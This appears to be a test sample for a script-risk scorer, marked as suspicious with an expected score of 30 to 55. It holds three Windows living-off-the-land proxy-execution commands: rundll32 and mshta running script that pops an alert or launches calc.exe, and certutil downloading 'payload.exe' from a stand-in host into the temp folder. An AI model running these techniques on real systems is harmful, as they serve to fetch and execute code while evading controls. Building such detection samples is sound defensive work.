# Suspicious: LOLBin proxy execution pattern.
# SAMPLE ONLY. Should score 30-55.
Start-Process rundll32.exe -ArgumentList "javascript:alert(1)"
Start-Process mshta.exe -ArgumentList "vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"calc.exe"""""")"
certutil.exe -urlcache -split -f "http://example.com/payload.exe" "%TEMP%\payload.exe"
